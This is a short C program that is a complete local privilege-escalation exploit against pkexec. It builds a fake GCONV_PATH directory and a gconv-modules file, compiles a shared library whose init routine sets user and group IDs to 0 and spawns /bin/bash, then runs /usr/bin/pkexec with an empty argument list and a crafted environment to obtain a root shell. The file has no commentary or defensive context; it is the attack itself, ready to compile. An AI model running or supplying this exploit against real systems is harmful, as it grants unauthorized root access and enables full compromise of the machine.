#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	system("mkdir GCONV_PATH=.");
	system("touch GCONV_PATH=./exploit");
	system("chmod +x GCONV_PATH=./exploit");
	system("mkdir exploit");
	system("echo 'module BS_4730// INTERNAL ISO646 2\nmodule INTERNAL BS_4730// ISO646 2\nalias MYCHARSET// BS_4730//\nmodule BS_4730// INTERNAL ISO646 2' >> exploit/gconv-modules");
	system("echo '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init() {\n\tsetuid(0);\n\tsetgid(0);\n\tseteuid(0);\n\tsetegid(0);\n\tsystem(\"/bin/bash\");\n}' >> exploit/shelltospawn.c");
	system("gcc exploit/shelltospawn.c -o exploit/ISO646.so -shared -fPIC");
	char *env[] = { "exploit", "PATH=GCONV_PATH=.", "CHARSET=MYCHARSET", "SHELL=hey/man/what/are/you/doing/this/place/is/non-existent", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
